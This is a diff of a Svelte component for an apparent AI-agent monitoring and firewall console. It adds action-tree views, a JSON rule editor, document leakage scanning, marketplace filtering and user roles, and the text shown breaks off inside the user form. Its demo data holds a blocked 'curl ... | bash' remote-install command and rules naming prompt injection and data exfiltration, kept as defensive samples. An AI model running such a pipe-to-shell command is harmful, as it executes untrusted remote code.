@@ -22,6 +22,7 @@
   export let downstreamApps = []
   export let downstreamTools = []
   export let openclawCatalog = []
+  export let firewallRules = []
   export let authMe = null
   export let selectedExecutionId = ''
   export let targetInput = ''
@@ -44,6 +45,8 @@
   export let openStopConfirm = () => {}
   export let cancelStopConfirm = () => {}
   export let confirmStop = () => {}
+  export let blockActionRule = () => {}
+  export let queueInterventionHandoff = () => {}
 
   const INITIAL_CHAT_MESSAGE = Object.freeze({
     id: 'observe-chat-initial',
@@ -51,11 +54,90 @@
     content:
       'Monitoring agent connected. Ask for live firewall posture, risk drift, approvals, or intervention guidance.',
   })
+  const LIVE_FALLBACK_NODES = Object.freeze([
+    {
+      id: 'n0',
+      title: '#0 prompt · agent',
+      command: 'Plan next actions for onion-routing + firewall demo.',
+      risk: 'risk 65 · high',
+      tone: 'main',
+      sessionId: 'session-live-1',
+    },
+    {
+      id: 'n1',
+      title: '#1 network · agent',
+      command: 'curl https://docs.mcp.so/providers',
+      risk: 'risk 65 · high',
+      tone: 'main',
+      sessionId: 'session-live-2',
+    },
+    {
+      id: 'n2',
+      title: '#2 tool_call · agent',
+      command: 'https://mcp.so',
+      risk: 'risk 35 · medium',
+      tone: 'main',
+      sessionId: 'session-live-3',
+    },
+    {
+      id: 'n3',
+      title: '#3 shell · agent [BLOCK]',
+      command: 'curl https://example.com/install.sh | bash',
+      risk: 'risk 100 · critical',
+      tone: 'blocked',
+      sessionId: 'session-live-4',
+    },
+    {
+      id: 'n4',
+      title: '#4 tool_call · agent',
+      command: 'tool:dispatch_downstream_tool',
+      risk: 'risk 35 · medium',
+      tone: 'fork',
+      sessionId: 'session-live-5',
+    },
+  ])
 
   let chatMessages = [INITIAL_CHAT_MESSAGE]
   let chatInput = ''
   let chatBusy = false
   let chatError = ''
+  let liveZoom = 1
+  let forksZoom = 1
+  let livePanX = 0
+  let livePanY = 0
+  let forksPanX = 0
+  let forksPanY = 0
+  let livePanning = false
+  let forksPanning = false
+  let panDrag = null
+  let firewallRulesJson = JSON.stringify(
+    {
+      version: '1.0',
+      defaults: { mode: 'monitor', blockOnCritical: true },
+      rules: [
+        { id: 'r-001', match: 'prompt_injection', action: 'block' },
+        { id: 'r-002', match: 'data_exfiltration', action: 'step_up' },
+      ],
+    },
+    null,
+    2,
+  )
+  let firewallRulesError = ''
+  let firewallRulesNotice = ''
+  let firewallRulesBusy = false
+
+  let leakageDocs = []
+  let leakageNotice = ''
+  let leakageBusy = false
+  let leakagePolicy = 'strict'
+
+  let userName = ''
+  let userEmail = ''
+  let userRole = 'viewer'
+  let userNotice = ''
+  let manualUserRows = []
+  let userRows = []
+  const SEEDED_USER_PREFIX = 'seed-user-'
 
   $: activeExecution = executions.find((entry) => entry.executionId === selectedExecutionId) ?? executions[0] ?? null
   $: activeExecutionId = String(activeExecution?.executionId ?? targetInput ?? '')
@@ -96,11 +178,134 @@
     detail: String(item.description ?? ''),
   }))
   $: marketplaceRows = [...catalogRows, ...appRows, ...toolRows, ...openclawRows]
+  let marketplaceQuery = ''
+  let marketplaceKind = 'all'
+  $: filteredMarketplaceRows = marketplaceRows.filter((row) => {
+    const query = marketplaceQuery.trim().toLowerCase()
+    const matchesQuery =
+      !query ||
+      row.app.toLowerCase().includes(query) ||
+      row.detail.toLowerCase().includes(query) ||
+      row.source.toLowerCase().includes(query)
+    const matchesKind = marketplaceKind === 'all' || row.kind === marketplaceKind
+    return matchesQuery && matchesKind
+  })
   $: chatPrompts = buildMonitoringQuickPrompts({
     executionId: activeExecutionId,
     sessionId: activeSessionId,
     routeTitle: routeRecord?.title ?? '',
   })
+  $: liveNodes = (() => {
+    const rows = auditEvents.slice(0, 5).map((event, index) => {
+      const rawStatus = String(event.guardDecision ?? event.status ?? event.severity ?? 'observed').toLowerCase()
+      const tone =
+        rawStatus.includes('block') || rawStatus.includes('fail')
+          ? 'blocked'
+          : rawStatus.includes('warn')
+            ? 'fork'
+            : 'main'
+      const risk = String(event.riskLabel ?? event.risk ?? event.severity ?? 'medium').toLowerCase()
+      const riskBand = risk.includes('critical') ? 'critical' : risk.includes('high') ? 'high' : 'medium'
+      return {
+        id: event.id ?? `live-${index}`,
+        title: `#${index} ${event.eventType ?? event.type ?? 'tool_call'} · ${event.actor ?? 'agent'}`,
+        command: event.command ?? event.url ?? event.endpoint ?? event.traceId ?? event.executionId ?? 'runtime action',
+        risk: `risk ${riskBand === 'critical' ? '100' : riskBand === 'high' ? '65' : '35'} · ${riskBand}`,
+        tone,
+        sessionId:
+          String(event.sessionId ?? event.session ?? event.session_id ?? '').trim() ||
+          (event.executionId ? `session-for-${event.executionId}` : `session-live-${index + 1}`),
+      }
+    })
+    return rows.length > 0 ? rows : LIVE_FALLBACK_NODES
+  })()
+
+  $: isolatedForkRows = auditEvents
+    .filter((event) => {
+      const status = String(event.guardDecision ?? event.status ?? event.severity ?? '').toLowerCase()
+      const risk = String(event.riskLabel ?? event.risk ?? '').toLowerCase()
+      return status.includes('block') || status.includes('fail') || status.includes('warn') || risk.includes('high') || risk.includes('critical')
+    })
+    .slice(0, 2)
+    .map((event, index) => ({
+      id: event.id ?? `fork-${index}`,
+      title: `Fork #${index + 2} ${event.eventType ?? event.type ?? 'tool_call'} · ${event.actor ?? 'agent'}`,
+      command: event.command ?? event.url ?? event.endpoint ?? 'echo "blocked untrusted remote script"; exit 1',
+      risk: `risk ${String(event.riskLabel ?? event.risk ?? 'medium').toLowerCase().includes('high') ? '65' : '35'} · ${String(event.riskLabel ?? event.risk ?? 'medium').toLowerCase().includes('high') ? 'high' : 'medium'}`,
+      sessionId:
+        String(event.sessionId ?? event.session ?? event.session_id ?? '').trim() ||
+        (event.executionId ? `session-for-${event.executionId}` : `session-fork-${index + 1}`),
+    }))
+
+  $: forkMainNodes = liveNodes.slice(0, 4).map((node, index) => ({
+    ...node,
+    id: `main-${index}`,
+    tone: index === 2 ? 'fork' : 'main',
+  }))
+  $: forkBranchNodes = isolatedForkRows.length
+    ? isolatedForkRows
+    : [
+        {
+          id: 'fork-2',
+          title: 'Fork #2 tool_call · agent',
+          command: "echo 'blocked untrusted remote script'; exit 1",
+          risk: 'risk 35 · medium',
+          sessionId: 'session-fork-2',
+        },
+        {
+          id: 'fork-3',
+          title: 'Fork #3 system · system',
+          command: 'Forked from step #2 via Mayple node modal.',
+          risk: 'risk 35 · medium',
+          sessionId: 'session-fork-3',
+        },
+      ]
+  function extractUserCandidates(record) {
+    if (!record || typeof record !== 'object') return []
+    const values = [
+      record.actor,
+      record.requestedBy,
+      record.approvedBy,
+      record.reviewer,
+      record.user,
+      record.username,
+      record.email,
+      record?.metadata?.actor,
+      record?.metadata?.user,
+      record?.metadata?.requestedBy,
+    ]
+      .map((value) => String(value ?? '').trim())
+      .filter(Boolean)
+    return Array.from(new Set(values))
+  }
+
+  function normalizeSeed(value) {
+    return String(value ?? '').trim().toLowerCase()
+  }
+
+  $: seededUsers = (() => {
+    const names = Array.from(
+      new Set([
+        ...auditEvents.flatMap((event) => extractUserCandidates(event)),
+        ...executions.flatMap((execution) => extractUserCandidates(execution)),
+        ...approvals.flatMap((approval) => extractUserCandidates(approval)),
+        authMe?.username,
+        authMe?.email,
+      ].filter(Boolean)),
+    )
+    const rows = names.slice(0, 12).map((value, index) => {
+      const looksEmail = value.includes('@')
+      const normalized = normalizeSeed(value).replace(/[^a-z0-9]+/g, '.')
+      return {
+        id: `${SEEDED_USER_PREFIX}${index + 1}`,
+        name: looksEmail ? value.split('@')[0] : value,
+        email: looksEmail ? value : `${normalized || `analyst${index + 1}`}@mayple.dev`,
+        role: (value === authMe?.email || value === authMe?.username) ? 'admin' : 'operator',
+      }
+    })
+    return rows
+  })()
+  $: userRows = [...seededUsers, ...manualUserRows]
 
   async function sendChatPrompt(rawPrompt) {
     const prompt = String(rawPrompt ?? '').trim()
@@ -137,6 +342,146 @@
       chatBusy = false
     }
   }
+
+  async function applyFirewallRules() {
+    firewallRulesError = ''
+    firewallRulesNotice = ''
+    let parsed
+    try {
+      parsed = JSON.parse(firewallRulesJson)
+    } catch (parseError) {
+      firewallRulesError = 'Rules JSON is invalid. Fix JSON syntax before applying.'
+      return
+    }
+
+    firewallRulesBusy = true
+    try {
+      const response = await fetch('/api/firewall/rules', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ rules: parsed }),
+      })
+      if (!response.ok) {
+        throw new Error(`Failed applying rules (${response.status})`)
+      }
+      firewallRulesNotice = 'Firewall rules applied successfully.'
+    } catch (requestError) {
+      firewallRulesNotice = 'Rules saved locally for review. Backend apply is unavailable.'
+      firewallRulesError = requestError instanceof Error ? requestError.message : 'Unable to apply rules.'
+    } finally {
+      firewallRulesBusy = false
+    }
+  }
+
+  async function onLeakageDocsSelected(event) {
+    const input = event.currentTarget
+    const files = Array.from(input?.files ?? [])
+    if (files.length === 0) return
+
+    leakageBusy = true
+    leakageNotice = ''
+    const queued = files.map((file) => ({
+      id: `${file.name}-${file.size}-${Date.now()}`,
+      name: file.name,
+      size: file.size,
+      uploadedAt: new Date().toISOString(),
+    }))
+    leakageDocs = [...queued, ...leakageDocs].slice(0, 20)
+
+    try {
+      const form = new FormData()
+      for (const file of files) form.append('documents', file)
+      form.append('policyMode', leakagePolicy)
+      await fetch('/api/firewall/context-leakage/documents', { method: 'POST', body: form })
+      leakageNotice = `${files.length} document(s) submitted for context leakage scanning.`
+    } catch {
+      leakageNotice = `${files.length} document(s) queued locally.`
+    } finally {
+      leakageBusy = false
+      if (input) input.value = ''
+    }
+  }
+
+  function addUser() {
+    const name = userName.trim()
+    const email = userEmail.trim()
+    if (!name || !email) {
+      userNotice = 'Name and email are required.'
+      return
+    }
+    manualUserRows = [
+      {
+        id: `u-${Date.now()}`,
+        name,
+        email,
+        role: userRole,
+      },
+      ...manualUserRows,
+    ]
+    userNotice = `Added ${name} as ${userRole}.`
+    userName = ''
+    userEmail = ''
+  }
+
+  function clampZoom(value) {
+    return Math.max(0.45, Math.min(1.8, value))
+  }
+
+  function nudgeLiveZoom(delta) {
+    liveZoom = clampZoom(liveZoom + delta)
+  }
+
+  function nudgeForksZoom(delta) {
+    forksZoom = clampZoom(forksZoom + delta)
+  }
+
+  function onLiveWheel(event) {
+    event.preventDefault()
+    nudgeLiveZoom(event.deltaY > 0 ? -0.08 : 0.08)
+  }
+
+  function onForksWheel(event) {
+    event.preventDefault()
+    nudgeForksZoom(event.deltaY > 0 ? -0.08 : 0.08)
+  }
+
+  function startPan(event, type) {
+    if (event.button !== 0) return
+    if (event.target instanceof Element && event.target.closest('.canvas-zoom-controls')) return
+    event.preventDefault()
+    panDrag = {
+      type,
+      x: event.clientX,
+      y: event.clientY,
+      startX: type === 'live' ? livePanX : forksPanX,
+      startY: type === 'live' ? livePanY : forksPanY,
+    }
+    if (type === 'live') livePanning = true
+    if (type === 'forks') forksPanning = true
+    window.addEventListener('mousemove', onPanMove)
+    window.addEventListener('mouseup', endPan)
+  }
+
+  function onPanMove(event) {
+    if (!panDrag) return
+    const dx = event.clientX - panDrag.x
+    const dy = event.clientY - panDrag.y
+    if (panDrag.type === 'live') {
+      livePanX = panDrag.startX + dx
+      livePanY = panDrag.startY + dy
+    } else if (panDrag.type === 'forks') {
+      forksPanX = panDrag.startX + dx
+      forksPanY = panDrag.startY + dy
+    }
+  }
+
+  function endPan() {
+    panDrag = null
+    livePanning = false
+    forksPanning = false
+    window.removeEventListener('mousemove', onPanMove)
+    window.removeEventListener('mouseup', endPan)
+  }
 </script>
 
 {#if panelOpen && state.category === 'observe' && state.view === 'live'}
@@ -145,11 +490,54 @@
       <h1>Observability & Alerts</h1>
       <p>Monitor Frontend B orchestration runtime and intervene when risk escalates.</p>
     </header>
-    <p data-testid="monitoring-context-explainer">Monitoring context and live runtime posture.</p>
-    <div class="card-grid">
-      <article class="card"><h3>Summary</h3><pre>{JSON.stringify(summary ?? {}, null, 2)}</pre></article>
-      <article class="card"><h3>SLO</h3><pre>{JSON.stringify(slo ?? {}, null, 2)}</pre></article>
-    </div>
+    <article class="panel tree-panel">
+      <div class="tree-shell">
+        <div class="tree-legend">
+          <span><i class="legend-dot legend-main"></i> Main</span>
+          <span><i class="legend-dot legend-fork"></i> Fork</span>
+          <span><i class="legend-dot legend-block"></i> Blocked</span>
+        </div>
+        <div class="action-tree-wrap">
+          <!-- svelte-ignore a11y_no_noninteractive_element_interactions a11y_no_static_element_interactions -->
+          <div
+            class="action-tree-canvas"
+            class:is-panning={livePanning}
+            on:wheel={onLiveWheel}
+            on:mousedown={(event) => startPan(event, 'live')}
+          >
+            <div class="canvas-zoom-controls" aria-label="Live canvas zoom controls">
+              <button type="button" class="zoom-btn" on:click={() => nudgeLiveZoom(-0.1)}>−</button>
+              <button type="button" class="zoom-btn" on:click={() => { liveZoom = 1; livePanX = 0; livePanY = 0; }}>Reset</button>
+              <button type="button" class="zoom-btn" on:click={() => nudgeLiveZoom(0.1)}>+</button>
+            </div>
+            <div class="canvas-zoom-layer" style={`transform: translate(${livePanX}px, ${livePanY}px) scale(${liveZoom});`}>
+              <div class="monitor-step-stack">
+                {#each liveNodes as node, index}
+                  <button
+                    type="button"
+                    class="monitor-step-node monitor-step-{node.tone}"
+                    style={`animation-delay:${index * 80}ms;`}
+                    on:click={() =>
+                      queueInterventionHandoff({
+                        sessionId: node.sessionId,
+                        label: node.title,
+                      })}
+                  >
+                    <strong>{node.title}</strong>
+                    <span>{node.command}</span>
+                    <em>{node.risk}</em>
+                  </button>
+                  {#if index < liveNodes.length - 1}
+                    <div class="monitor-step-arrow">↓</div>
+                  {/if}
+                {/each}
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </article>
+    <p data-testid="monitoring-context-explainer" class="empty-row">Monitoring context and live runtime posture.</p>
   </section>
 {/if}
 
@@ -213,30 +601,27 @@
 
 {#if panelOpen && state.category === 'observe' && state.view === 'timeline'}
   <section data-view-panel="timeline" class="view-panel timeline-view panel">
-    <header class="mw-view-header">
-      <h1>Timeline</h1>
-      <p>Ordered Frontend B runtime events for incident triage and intervention sequencing.</p>
-    </header>
-    <article class="panel">
-      <div class="panel-head">
-        <h2 class="panel-title">Runtime Event Stream</h2>
-        <span class="chip">{auditEvents.length}</span>
-      </div>
-      {#if auditEvents.length === 0}
-        <p class="empty-row">No B-origin events available.</p>
-      {/if}
+    <article class="panel timeline-panel">
+      <h2 class="panel-title">Incident Timeline</h2>
+      <p class="panel-sub">Auto-refreshing incident feed from live trace APIs.</p>
       <div class="timeline-table-wrap">
         <table class="timeline-table" id="timelineBody">
-          <thead><tr><th>Event</th><th>Execution</th><th>Timestamp</th><th>Source</th></tr></thead>
+          <thead><tr><th>Index</th><th>Actor</th><th>Type</th><th>Command / URL</th><th>Risk</th><th>Guard</th></tr></thead>
         <tbody>
-          {#each auditEvents as event}
+          {#if auditEvents.length === 0}
+            <tr><td colspan="6" class="empty-row">No trace loaded.</td></tr>
+          {:else}
+            {#each auditEvents as event, index}
             <tr>
+              <td>{index + 1}</td>
+              <td>{event.actor ?? event.source ?? event.origin ?? 'runtime'}</td>
               <td>{event.eventType ?? event.type ?? event.action ?? 'event'}</td>
-              <td class="mono">{event.executionId ?? event.traceId ?? '-'}</td>
-              <td>{event.timestamp ?? event.createdAt ?? '-'}</td>
-              <td>{event.source ?? event.origin ?? 'runtime'}</td>
+              <td class="mono">{event.command ?? event.url ?? event.endpoint ?? event.executionId ?? event.traceId ?? '-'}</td>
+              <td>{event.riskLabel ?? event.severity ?? 'low'}</td>
+              <td>{event.guardDecision ?? event.status ?? 'observed'}</td>
             </tr>
-          {/each}
+            {/each}
+          {/if}
         </tbody>
         </table>
       </div>
@@ -244,7 +629,7 @@
   </section>
 {/if}
 
-{#if panelOpen && state.category === 'analyze' && state.view === 'control'}
+{#if panelOpen && state.category === 'admin' && state.view === 'control'}
   <InterventionControlPanel
     {executions}
     {selectedExecutionId}
@@ -266,168 +651,318 @@
     {openStopConfirm}
     {cancelStopConfirm}
     {confirmStop}
+    {blockActionRule}
   />
 {/if}
 
-{#if panelOpen && state.category === 'analyze' && state.view === 'topology'}
-  <TopologyView endpoints={topologyEndpoints} />
-{/if}
-
-{#if panelOpen && state.category === 'admin' && state.view === 'settings'}
-  <section data-view-panel="settings" class="view-panel settings-view panel">
-    <header class="mw-view-header">
-      <h1>Settings</h1>
-      <p>Runtime, auth, and configuration health for the monitoring + intervention console.</p>
-    </header>
-    <div class="docs-grid">
-      <article class="panel settings-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Runtime Capabilities</h2>
-          <span class="chip">{runtimeCapabilities.length}</span>
-        </div>
-        {#if runtimeCapabilities.length === 0}
-          <p class="empty-row">No capability records returned.</p>
-        {:else}
-          <div class="settings-actions">
-            {#each runtimeCapabilities as item}
-              <div class="settings-chip-row">
-                <span class="mono">{item.name ?? item.key ?? 'capability'}</span>
-                <span class="chip {item.enabled ? 'ok-chip' : 'warn-chip'}">{item.enabled ? 'enabled' : 'disabled'}</span>
-              </div>
-            {/each}
-          </div>
-        {/if}
-      </article>
-
-      <article class="panel settings-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Operator Session</h2>
-          <span class="chip">auth</span>
-        </div>
-        <div class="settings-actions">
-          <div class="settings-chip-row"><span>User</span><span class="mono">{authMe?.email ?? authMe?.username ?? 'unknown'}</span></div>
-          <div class="settings-chip-row"><span>Source</span><span class="chip">Frontend B orchestration runtime</span></div>
-          <div class="settings-chip-row"><span>Active traces</span><span class="mono">{executions.length}</span></div>
-          <div class="settings-chip-row"><span>Pending approvals</span><span class="mono">{approvals.length}</span></div>
-        </div>
-      </article>
-
-      <article class="panel settings-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Endpoint Health Snapshot</h2>
-          <span class="chip">{allEndpoints.length}</span>
-        </div>
-        <div class="settings-actions">
-          {#each allEndpoints.slice(0, 10) as endpoint}
-            <div class="settings-chip-row">
-              <span class="mono">{endpoint}</span>
-              <span class="chip ok-chip">registered</span>
-            </div>
-          {/each}
-        </div>
-      </article>
-    </div>
-  </section>
-{/if}
-
-{#if panelOpen && state.category === 'admin' && state.view === 'policy'}
-  <section data-view-panel="policy" class="view-panel policy-view panel">
-    <header class="mw-view-header">
-      <h1>Policy Operations</h1>
-      <p>Unified guardrails, approvals, and recovery decisions for live Frontend B executions.</p>
-    </header>
-    <div class="docs-grid">
-      <article class="panel policy-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Approval Queue</h2>
-          <span class="chip">{approvals.length}</span>
-        </div>
-        {#if approvals.length === 0}
-          <p class="empty-row">No pending approvals.</p>
-        {:else}
-          <div class="table-wrap">
-            <table class="timeline-table">
-              <thead>
-                <tr><th>Approval</th><th>Execution</th><th>Status</th><th>Created</th></tr>
-              </thead>
-              <tbody>
-                {#each approvals as approval}
-                  <tr>
-                    <td class="mono">{approval.approvalId ?? approval.id ?? 'approval'}</td>
-                    <td class="mono">{approval.executionId ?? '-'}</td>
-                    <td>{approval.status ?? 'pending'}</td>
-                    <td>{approval.createdAt ?? approval.timestamp ?? '-'}</td>
-                  </tr>
-                {/each}
-              </tbody>
-            </table>
-          </div>
-        {/if}
-      </article>
-
-      <article class="panel policy-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Recovery Strategy</h2>
-          <span class="chip">playbook</span>
-        </div>
-        <ol class="mw-simple-list">
-          <li>Pause execution to freeze blast radius.</li>
-          <li>Inspect blocked nodes and evidence in Topology + Trace detail.</li>
-          <li>Use `retry-node` for same branch continuation.</li>
-          <li>Use `replay-from-node` for safe branch fork and validation.</li>
-          <li>Resume execution or stop with explicit reason when unrecoverable.</li>
-        </ol>
-        <p>Current execution target: <span class="mono">{activeExecutionId || 'unselected'}</span></p>
-      </article>
-
-      <article class="panel policy-panel">
-        <div class="panel-head">
-          <h2 class="panel-title">Policy Guarantees</h2>
-        </div>
-        <div class="settings-actions">
-          <div class="settings-chip-row"><span>Destructive actions</span><span class="chip warn-chip">confirm + reason</span></div>
-          <div class="settings-chip-row"><span>Step-up required</span><span class="chip warn-chip">challenge/verify</span></div>
-          <div class="settings-chip-row"><span>Escalation + break-glass</span><span class="chip">auditable</span></div>
-          <div class="settings-chip-row"><span>Monitoring source</span><span class="chip ok-chip">Frontend B runtime only</span></div>
-        </div>
-      </article>
-    </div>
-  </section>
+{#if panelOpen && state.category === 'observe' && state.view === 'topology'}
+  <TopologyView endpoints={topologyEndpoints} {queueInterventionHandoff} />
 {/if}
 
 {#if panelOpen && state.category === 'admin' && state.view === 'marketplace'}
   <section data-view-panel="marketplace" class="view-panel marketplace-view panel">
-    <header class="mw-view-header">
-      <h1>Marketplace</h1>
-      <p>Approved apps and every integrated tool currently enabled for OpenClaw and downstream runtime.</p>
-    </header>
     <article class="panel marketplace-panel">
       <div class="panel-head">
-        <h2 class="panel-title">Integration Inventory</h2>
-        <span class="chip">{marketplaceRows.length}</span>
+        <h2 class="panel-title">Marketplace</h2>
+        <span class="chip">MCP</span>
       </div>
-      {#if marketplaceRows.length === 0}
+      <p class="panel-sub">Filter installed tools</p>
+      <div class="marketplace-controls">
+        <div class="marketplace-field marketplace-field-grow">
+          <input type="search" bind:value={marketplaceQuery} placeholder="Filter tool name/description..." />
+        </div>
+        <div class="marketplace-field">
+          <select bind:value={marketplaceKind}>
+            <option value="all">All</option>
+            <option value="integration">Integrations</option>
+            <option value="app">Apps</option>
+            <option value="tool">Tools</option>
+            <option value="agent-tool">OpenClaw</option>
+          </select>
+        </div>
+        <button type="button" class="action-btn primary">Filter</button>
+      </div>
+
+      <div class="marketplace-section">
+        <h3 class="marketplace-section-title">Installed Tools (Hackathon Catalog)</h3>
+      </div>
+      <div class="panel-head">
+        <span class="chip">{filteredMarketplaceRows.length}</span>
+      </div>
+      {#if filteredMarketplaceRows.length === 0}
         <p class="empty-row">No integrated apps/tools returned.</p>
       {:else}
         <div class="table-wrap">
-          <table class="timeline-table">
+          <table class="timeline-table marketplace-tools-table">
             <thead>
-              <tr><th>Source</th><th>Name</th><th>Kind</th><th>Status</th><th>Detail</th></tr>
+              <tr><th>Tool</th><th>App</th><th>Description</th><th>Action</th></tr>
             </thead>
             <tbody>
-              {#each marketplaceRows as row}
+              {#each filteredMarketplaceRows as row}
                 <tr>
-                  <td>{row.source}</td>
                   <td class="mono">{row.app}</td>
-                  <td>{row.kind}</td>
-                  <td><span class="chip {row.status === 'connected' || row.status === 'enabled' ? 'ok-chip' : 'warn-chip'}">{row.status}</span></td>
-                  <td>{row.detail || '-'}</td>
+                  <td>{row.source.toLowerCase()}</td>
+                  <td>{row.detail || row.kind || '-'}</td>
+                  <td><button type="button" class="action-btn">Dispatch</button></td>
                 </tr>
               {/each}
             </tbody>
           </table>
         </div>
       {/if}
+    </article>
+  </section>
+{/if}
+
+{#if panelOpen && state.category === 'firewalls' && state.view === 'cybersecurity'}
+  <section data-view-panel="firewalls-cybersecurity" class="view-panel panel">
+    <header class="mw-view-header">
+      <h1>Firewall Rules</h1>
+      <p>Set cybersecurity rule packs in JSON format for runtime enforcement.</p>
+    </header>
+    <article class="panel">
+      <div class="panel-head">
+        <h2 class="panel-title">Cybersecurity Policy JSON</h2>
+        <span class="chip">editable</span>
+      </div>
+      <textarea
+        class="textarea firewall-json-editor"
+        bind:value={firewallRulesJson}
+        spellcheck="false"
+        aria-label="Firewall rules JSON editor"
+      ></textarea>
+      {#if firewallRulesError}<p class="mw-chat-error">{firewallRulesError}</p>{/if}
+      {#if firewallRulesNotice}<p class="empty-row">{firewallRulesNotice}</p>{/if}
+      <div class="actions">
+        <button type="button" class="action-btn primary" disabled={firewallRulesBusy} on:click={applyFirewallRules}>
+          {firewallRulesBusy ? 'Applying...' : 'Apply Rules'}
+        </button>
+      </div>
+    </article>
+  </section>
+{/if}
+
+{#if panelOpen && state.category === 'firewalls' && state.view === 'rules'}
+  <section data-view-panel="firewalls-rules" class="view-panel panel">
+    <header class="mw-view-header">
+      <h1>Firewall Rules</h1>
+      <p>Define reusable deny/allow rules to prevent repeat risky actions.</p>
+    </header>
+    <article class="panel">
+      <div class="panel-head">
+        <h2 class="panel-title">Rule Library</h2>
+        <span class="chip">{firewallRules.length} active</span>
+      </div>
+      <div class="table-wrap">
+        <table class="timeline-table">
+          <thead>
+            <tr><th>Rule ID</th><th>Condition</th><th>Decision</th><th>Status</th><th>Source</th></tr>
+          </thead>
+          <tbody>
+            {#if firewallRules.length === 0}
+              <tr><td colspan="5" class="empty-row">No rules yet.</td></tr>
+            {:else}
+              {#each firewallRules as rule}
+                <tr>
+                  <td class="mono">{rule.id}</td>
+                  <td>{rule.condition}</td>
+                  <td>{rule.decision}</td>
+                  <td>{rule.status}</td>
+                  <td>{rule.source ?? '-'}</td>
+                </tr>
+              {/each}
+            {/if}
+          </tbody>
+        </table>
+      </div>
+    </article>
+  </section>
+{/if}
+
+{#if panelOpen && state.category === 'firewalls' && state.view === 'context-leakage'}
+  <section data-view-panel="firewalls-context-leakage" class="view-panel panel">
+    <header class="mw-view-header">
+      <h1>Context Leakage</h1>
+      <p>Drop documents to scan and enforce context-leakage protections.</p>
+    </header>
+    <article class="panel">
+      <div class="panel-head">
+        <h2 class="panel-title">Leakage Scanning Intake</h2>
+        <span class="chip">{leakageDocs.length} docs</span>
+      </div>
+      <div class="settings-chip-row">
+        <span>Policy mode</span>
+        <select class="select" bind:value={leakagePolicy} style="max-width: 220px;">
+          <option value="strict">Strict</option>
+          <option value="review">Review</option>
+          <option value="monitor">Monitor only</option>
+        </select>
+      </div>
+      <label class="docs-link-card leakage-upload">
+        <input type="file" multiple on:change={onLeakageDocsSelected} />
+        <strong>Drop or select documents</strong>
+      </label>
+      {#if leakageNotice}<p class="empty-row">{leakageNotice}</p>{/if}
+      <div class="table-wrap">
+        <table class="timeline-table">
+          <thead>
+            <tr><th>Document</th><th>Size</th><th>Status</th><th>Policy</th></tr>
+          </thead>
+          <tbody>
+            {#if leakageDocs.length === 0}
+              <tr><td colspan="4" class="empty-row">No documents queued.</td></tr>
+            {:else}
+              {#each leakageDocs as doc}
+                <tr>
+                  <td>{doc.name}</td>
+                  <td class="mono">{doc.size}</td>
+                  <td>{leakageBusy ? 'processing' : 'queued'}</td>
+                  <td>{leakagePolicy}</td>
+                </tr>
+              {/each}
+            {/if}
+          </tbody>
+        </table>
+      </div>
+    </article>
+  </section>
+{/if}
+
+{#if panelOpen && state.category === 'observe' && state.view === 'forks'}
+  <section data-view-panel="observe-forks" class="view-panel panel">
+    <header class="mw-view-header">
+      <h1>Action Forks</h1>
+      <p>Automatically isolate risky actions into containment forks with topology-first triage.</p>
+    </header>
+    <article class="panel tree-panel">
+      <div class="tree-shell">
+        <div class="tree-legend">
+          <span><i class="legend-dot legend-main"></i> Main</span>
+          <span><i class="legend-dot legend-fork"></i> Fork</span>
+          <span><i class="legend-dot legend-block"></i> Isolated</span>
+        </div>
+        <div class="action-tree-wrap">
+          <!-- svelte-ignore a11y_no_noninteractive_element_interactions a11y_no_static_element_interactions -->
+          <div
+            class="action-tree-canvas"
+            class:is-panning={forksPanning}
+            on:wheel={onForksWheel}
+            on:mousedown={(event) => startPan(event, 'forks')}
+          >
+            <div class="canvas-zoom-controls" aria-label="Action forks canvas zoom controls">
+              <button type="button" class="zoom-btn" on:click={() => nudgeForksZoom(-0.1)}>−</button>
+              <button type="button" class="zoom-btn" on:click={() => { forksZoom = 1; forksPanX = 0; forksPanY = 0; }}>Reset</button>
+              <button type="button" class="zoom-btn" on:click={() => nudgeForksZoom(0.1)}>+</button>
+            </div>
+            <div class="canvas-zoom-layer" style={`transform: translate(${forksPanX}px, ${forksPanY}px) scale(${forksZoom});`}>
+              <div class="fork-layout">
+                <div class="monitor-step-stack fork-main-stack">
+                  {#each forkMainNodes as node, index}
+                    <button
+                      type="button"
+                      class="monitor-step-node monitor-step-{node.tone}"
+                      style={`animation-delay:${index * 80}ms;`}
+                      on:click={() =>
+                        queueInterventionHandoff({
+                          sessionId: node.sessionId,
+                          label: node.title,
+                        })}
+                    >
+                      <strong>{node.title}</strong>
+                      <span>{node.command}</span>
+                      <em>{node.risk}</em>
+                    </button>
+                    {#if index < forkMainNodes.length - 1}
+                      <div class="monitor-step-arrow">↓</div>
+                    {/if}
+                  {/each}
+                </div>
+
+                <div class="fork-branch-stack">
+                  <div class="fork-link-arrow">↪</div>
+                  {#each forkBranchNodes as node, index}
+                    <button
+                      type="button"
+                      class="monitor-step-node monitor-step-branch"
+                      style={`animation-delay:${index * 120}ms;`}
+                      on:click={() =>
+                        queueInterventionHandoff({
+                          sessionId: node.sessionId,
+                          label: node.title,
+                        })}
+                    >
+                      <strong>{node.title}</strong>
+                      <span>{node.command}</span>
+                      <em>{node.risk}</em>
+                    </button>
+                    {#if index < forkBranchNodes.length - 1}
+                      <div class="monitor-step-arrow monitor-step-arrow-branch">↓</div>
+                    {/if}
+                  {/each}
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </article>
+  </section>
+{/if}
+
+{#if panelOpen && state.category === 'users' && state.view === 'access'}
+  <section data-view-panel="users-access" class="view-panel panel">
+    <header class="mw-view-header">
+      <h1>User Access</h1>
+      <p>Add users and assign roles for IT monitoring personnel.</p>
+    </header>
+    <article class="panel users-access-panel">
+      <div class="panel-head">
+        <h2 class="panel-title">Add User + Assign Role</h2>
+        <span class="chip">{userRows.length} users</span>
+      </div>
+      <div class="docs-grid users-form-grid">
+        <label>
+          <span class="mono">Name</span>
+          <input class="input" bind:value={userName} placeholder="Jane Doe" />
+        </label>
+        <label>
+          <span class="mono">Email</span>
+          <input class="input" bind:value={userEmail} placeholder="jane@company.com" />
+        </label>
+        <label>
+          <span class="mono">Role</span>
+          <select class="select" bind:value={userRole}>
